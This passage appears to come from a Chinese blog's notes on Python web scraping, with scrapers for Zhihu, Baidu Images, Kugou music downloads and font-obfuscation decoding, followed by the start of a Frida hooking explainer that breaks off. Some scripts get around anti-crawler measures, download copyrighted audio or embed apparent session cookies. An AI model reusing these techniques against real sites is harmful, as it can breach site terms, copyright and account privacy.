class="built_in">compile</span>(<span class="string">&#x27;&quot;metricsArea&quot;:&#123;&quot;text&quot;:&quot;(.*?)&quot;,&quot;fontColor&quot;&#x27;</span>,re.S|re.I|re.M)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://www.zhihu.com/billboard&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers)</span><br><span class="line">html.encoding=<span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line">titles=mytext.findall(html.text)</span><br><span class="line">pngs=mypng.findall(html.text)</span><br><span class="line">hot=myhot.findall(html.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> title,png,h <span class="keyword">in</span> <span class="built_in">zip</span>(titles,pngs,hot):</span><br><span class="line">    <span class="built_in">print</span>(title)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(png).replace(<span class="string">r&#x27;\u002F&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(h)</span><br><span class="line">    <span class="comment">#https://picx.zhimg.com/80/v2-4ef85f15104e8adce7928c98bff201d9_1440w.png</span></span><br><span class="line">    <span class="comment">#https:\u002F\u002Fpicx.zhimg.com\u002F80\u002Fv2-d29de6e187849296874ca235336c2521_720w.png</span></span><br><span class="line">    <span class="comment">#b&#x27;https://picx.zhimg.com/80/v2-d29de6e187849296874ca235336c2521_720w.png&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>文字里爬取案例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">列表页  翻页  URL 标题</span></span><br><span class="line"><span class="string">详情页  内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://www.lz13.cn/lizhi/lizhimingyan-35.html</span></span><br><span class="line"><span class="string">https://www.lz13.cn/lizhi/lizhimingyan-34.html</span></span><br><span class="line"><span class="string">https://www.lz13.cn/lizhi/lizhimingyan-33.html</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">https://www.lz13.cn/lizhi/lizhimingyan-1.html</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secondSpider</span>(<span class="params">url,title</span>):</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">    soup = BeautifulSoup(html.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    postHeader = soup.select(<span class="string">&#x27;.PostContent p&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;名言内容：&#x27;</span>,postHeader.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./content&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;./content&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./content/<span class="subst">&#123;title&#125;</span>.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(postHeader.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">firstSpider</span>(<span class="params">url</span>):</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">    soup = BeautifulSoup(html.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    postHeader = soup.select(<span class="string">&#x27;div#node-8890 .PostHead&#x27;</span>)</span><br><span class="line">    <span class="comment"># 列表页</span></span><br><span class="line">    <span class="keyword">for</span> ph <span class="keyword">in</span> postHeader:</span><br><span class="line">        innerUrl = ph.select(<span class="string">&#x27;span h3 a&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">        title = ph.select(<span class="string">&#x27;span h3 a&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;标题：<span class="subst">&#123;title&#125;</span> url：<span class="subst">&#123;innerUrl&#125;</span>&#x27;</span>)</span><br><span class="line">        secondSpider(innerUrl,title)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 翻页</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        url = <span class="string">f&#x27;https://www.lz13.cn/lizhi/lizhimingyan-<span class="subst">&#123;i&#125;</span>.html&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前爬取的网页URL：&#x27;</span>, url)</span><br><span class="line">        firstSpider(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li><li><p>图片类爬取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">AJAX 异步加载  瀑布流</span></span><br><span class="line"><span class="string">URL没有变化  内容却不断更新</span></span><br><span class="line"><span class="string">XHR请求     JSON（中间语言）   dict</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;antiFlag&quot;:1,&quot;message&quot;:&quot;Forbid spider access&quot;,&quot;bfe_log_id&quot;:&quot;11768782920408771089&quot;&#125;</span></span><br><span class="line"><span class="string">&#123;&quot;antiFlag&quot;:1,&quot;message&quot;:&quot;Forbid spider access&quot;,&quot;bfe_log_id&quot;:&quot;12078284916214976827&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">anti 反  anti_content</span></span><br><span class="line"><span class="string">spider  crawler 爬虫</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url=<span class="string">&#x27;https://image.baidu.com/search/acjson&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;BDqhfp=%E6%B1%BD%E8%BD%A6%26%26NaN-1undefined%26%260%26%261; indexPageSugList=%5B%22python%22%2C%22%E9%BB%91%E5%AE%A2%22%2C%22%E5%AE%89%E5%85%A8%22%2C%22%E9%80%86%E5%90%91%22%5D; PSTM=1670679924; BAIDUID=2C1FC9C9929E533A115F5A90621F6B92:FG=1; BIDUPSID=5B1DFD3B99B5065DF1522F28819214A1; H_PS_PSSID=37858_36555_37961_37910_37832_37872_37793_37949_37928_37758_37902_26350_37788_37881; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; BAIDUID_BFESS=2C1FC9C9929E533A115F5A90621F6B92:FG=1; delPer=0; PSINO=1; BDRCVFR[dG2JNJb_ajR]=mk3SLVN4HKm; userFrom=www.baidu.com; BDRCVFR[-pGxjrCMryR]=mk3SLVN4HKm; ab_sr=1.0.1_OGJiZGU5YTYwMGQwNzg5NmMwN2M4OWU2ODIwOWFhMDAxZTVhY2E2Y2JmY2MyZTVlNGZlZDM3YmRkZmM1ZThhMjI5MDY4NzAzMTRkMTEzZWYxNzc4YzFjMDJmYWI0NzA5YmE4NWM1MDBiNDY1NDM1YzZlZDljYjRiNmFiYWM0NGMzZmNiZjUzODJiYjhmZDMyNjE0ZjQzOTgwNmM2YTA4Zg==&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://image.baidu.com/search/index?tn=baiduimage&amp;ps=1&amp;ct=201326592&amp;lm=-1&amp;cl=2&amp;nc=1&amp;ie=utf-8&amp;dyTabStr=MCwzLDYsMSw1LDQsNywyLDgsOQ%3D%3D&amp;word=%E6%B1%BD%E8%BD%A6&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">pagenumber =<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;tn&#x27;</span>: <span class="string">&#x27;resultjson_com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;word&#x27;</span>:<span class="string">&#x27;汽车&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;queryWord&#x27;</span>:<span class="string">&#x27;汽车&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pn&#x27;</span>: <span class="built_in">str</span>(pagenumber),</span><br><span class="line">        <span class="string">&#x27;rn&#x27;</span>: <span class="string">&#x27;30&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    pagenumber+=<span class="number">30</span></span><br><span class="line">    html=requests.get(url,params=params,headers=headers)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> html.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i:</span><br><span class="line">            title=i[<span class="string">&#x27;fromPageTitle&#x27;</span>]</span><br><span class="line">            img=i[<span class="string">&#x27;thumbURL&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(i[<span class="string">&#x27;thumbURL&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./baiduimgs&#x27;</span>):</span><br><span class="line">                os.mkdir(<span class="string">&#x27;./baiduimgs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./baiduimgs/<span class="subst">&#123;title&#125;</span>.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(requests.get(img).content)</span><br></pre></td></tr></table></figure></li><li><p>酷狗音乐爬取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_mp3</span>(<span class="params">client,title,url</span>):</span><br><span class="line">    html=client.get(url)</span><br><span class="line">    play_url=html.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;play_url&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./mp3&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&#x27;./mp3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./mp3/<span class="subst">&#123;title&#125;</span>.mp3&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(client.get(play_url).content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">client</span>):</span><br><span class="line">    index_html=<span class="string">&#x27;https://www.kugou.com/yy/html/rank.html&#x27;</span></span><br><span class="line">    html1=client.get(index_html)</span><br><span class="line">    soup=BeautifulSoup(html1.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    data_flag=soup.select(<span class="string">&#x27;div.pc_temp_songlist.pc_rank_songlist_short ul li&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> eid <span class="keyword">in</span> data_flag:</span><br><span class="line">        data_eid=eid[<span class="string">&#x27;data-eid&#x27;</span>]</span><br><span class="line">        title=eid[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(title,data_eid)</span><br><span class="line">        mp3_url=<span class="string">f&#x27;https://wwwapi.kugou.com/yy/index.php?r=play/getdata&amp;encode_album_audio_id=<span class="subst">&#123;data_eid&#125;</span>&#x27;</span></span><br><span class="line">        download_mp3(client,title,mp3_url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;kg_mid=ea3b321c894d74b76b67e48b2058b1b0; Hm_lvt_aedee6983d4cfc62f509129360d6bb3d=1671683830; kg_dfid=08xnIG0VjAdG2L0f2t2WkE9j; kg_dfid_collect=d41d8cd98f00b204e9800998ecf8427e; kg_mid_temp=ea3b321c894d74b76b67e48b2058b1b0; Hm_lpvt_aedee6983d4cfc62f509129360d6bb3d=1671684384&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://www.kugou.com/&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    client = httpx.Client(headers=headers)</span><br><span class="line">    index(client)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ul><p>urlencode是一个函数，可将字符串以URL编码，用于编码处理</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse <span class="keyword">import</span> <span class="keyword">unquote</span>,<span class="keyword">quote</span></span><br></pre></td></tr></table></figure><ul><li><p>quote 编码</p></li><li><p>unquote解码</p></li></ul><p>m3u8</p><ul><li>blob 可能是 m3u8的标志</li><li>爬取m3u8，如果请求多了会请求kvcollect，爬取其中的vurl参数，爬取的结果就是关键，但是爬取的结果需要进行拼接，在网页检查中找一个请求的m3u8，然后留下标准的共同的请求头，在拼接爬取的部分即是一个完整的m3u8请求</li></ul><p>创建文件夹保存数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./文件夹名&quot;</span>)：</span><br><span class="line">os.mkdir(<span class="string">&quot;./文件夹名&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>文字反爬虫</strong></p><p>fontTools库 文字反爬虫用这个库来实现字字读取</p><p>fontCreator ==》查看网页自实现的文字映射</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__title__ = &#x27;13.字体反爬找文件&#x27;</span></span><br><span class="line"><span class="string">__author__ = &#x27;小肩膀教育&#x27;</span></span><br><span class="line"><span class="string">__mtime__ = &#x27;2022/1/13&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pip install fontTools</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">每次字体映射都不一样</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载字体</span></span><br><span class="line">myFont=requests.get(<span class="string">&#x27;https://www.shixiseng.com/interns/iconfonts/file?rand=0.4927580017483024&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.tff&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(myFont.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fontTools.ttLib <span class="keyword">import</span> TTFont</span><br><span class="line">font=TTFont(<span class="string">&#x27;./file.tff&#x27;</span>)  <span class="comment">#可以用fontCreator查看</span></span><br><span class="line">font.saveXML(<span class="string">&#x27;font.xml&#x27;</span>)   <span class="comment">#解析为xml 可以直接查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取对应关系</span></span><br><span class="line">bestcmap = font[<span class="string">&#x27;cmap&#x27;</span>].getBestCmap()</span><br><span class="line"><span class="comment">#print(bestcmap)    获取十六进制与unixxx对应关系</span></span><br><span class="line">newDict=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> bestcmap.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(k),v)</span><br><span class="line">    newDict[<span class="built_in">hex</span>(k)]=v</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#获取所有字体头</span></span><br><span class="line">fontNames=font.getGlyphOrder()</span><br><span class="line"><span class="built_in">print</span>(fontNames)</span><br><span class="line"><span class="comment">#映射unixxx 与真实字体的关系</span></span><br><span class="line">fontNameDict=&#123;</span><br><span class="line">    <span class="string">&#x27;uni70&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uni50&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uni30&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uni79&#x27;</span>:<span class="string">&#x27;y&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment">#div.intern-wrap.intern-item div.clearfix div.f-l p a</span></span><br><span class="line">url=<span class="string">&#x27;https://www.shixiseng.com/interns&#x27;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;intern&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;keyword&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;全国&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,params=params,headers=headers)</span><br><span class="line">soup=BeautifulSoup(html.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">result=soup.select(<span class="string">&#x27;div.intern-wrap.intern-item div.clearfix div.f-l p a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> result:</span><br><span class="line">    res=r[<span class="string">&#x27;title&#x27;</span>].replace(<span class="string">&#x27;&amp;#&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> newDict.items():</span><br><span class="line">        res=res.replace(k,v)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> fontNameDict.items():</span><br><span class="line">        res=res.replace(k,v)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><strong>py脚本中运行js</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;js脚本&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>).read();</span><br><span class="line">js_code=execjs.<span class="built_in">compile</span>(file);</span><br><span class="line">res=js_code.call(<span class="string">&#x27;调用js中的方法名字&#x27;</span>，<span class="string">&#x27;方法中的参数&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>frida</h1><p>frida一些API使用参考https://www.anquanke.com/post/id/195869#h3-20   官方文档：<a href="http://frida.re">frida.re</a></p><h2 id="frida的代码结构">frida的代码结构</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frida-core：frida核心库</span><br><span class="line">frida-gum：inline-hook框架</span><br><span class="line"></span><br><span class="line"><span class="keyword">bindings：</span></span><br><span class="line"><span class="keyword"></span>frida-python：python</span><br><span class="line">frida-node：Node.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>frida-qml：Qml</span><br><span class="line">frida-<span class="keyword">swift：Swift</span></span><br><span class="line"><span class="keyword"></span>frida-tools：CLI tools</span><br><span class="line"><span class="symbol">capstone:</span><span class="keyword">instruction </span><span class="keyword">disammbler</span></span><br><span class="line"><span class="keyword"></span>gum-<span class="keyword">js：为 </span>frida-gum 提供 <span class="keyword">JavaScript </span>语言的接口。</span><br></pre></td></tr></table></figure><h2 id="frida实现hook的原理">frida实现hook的原理</h2><p><a href="https://bbs.kanxue.com/thread-229215.htm">https://bbs.kanxue.com/thread-229215.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2">https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2</a></p><p>frida-java实现了js到java代码的单向通道，即可以通过frida-java，我们可以利用js代码实现：调用java方法，创建java对象，对java函数方法进行hook。</p><p><strong>从两个方面来解析frida-java源码</strong></p><ul><li>frida-java是如何连通到java世界的</li><li>frida-java如何实现java层方法hook</li></ul><h3 id="frida-java是如何连通到java世界的">frida-java是如何连通到java世界的</h3><ul><li>通过frida-gum提供的js接口操作native世界，然后再基于jni连通到java世界<img src="assets/image-20241024145016576.png" alt="image-20241024145016576"></li></ul><p>主要步骤：</p><ol><li>通过frida-gum连接native世界，获得一些虚拟机接口，如JNI_GetCreatedJavaVMs</li><li>获得javaVM</li><li>获得JNIENv</li><li>获得java类的class引用</li><li>操作该java类，如创建对象，调用方法</li></ol><h4 id="连通native世界">连通native世界</h4><p>利用frida-gum中提供的Moudle,Memory,NativeFunction模块可以实现查找、调用、hook导出函数；读写、分配内存等操作。如下面例子所示, 可以在js代码中调用native函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> friendlyFunctionName = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(friendlyFunctionPtr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> returnValue = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(sizeOfLargeObject);</span><br><span class="line"><span class="title function_">friendlyFunctionName</span>(returnValue, thisPtr);</span><br></pre></td></tr></table></figure><h4 id="获得JavaVM">获得JavaVM</h4><p>要使用JNI连通java世界，首先要获得JavaVM。frida-java通过调用JNI_GetCreatedJavaVMs来获取JavaVM，Dalvik虚拟机和ART虚拟机均实现了该函数。核心代码如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/android.js</span></span><br><span class="line"><span class="keyword">const</span> vms = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line"><span class="keyword">const</span> 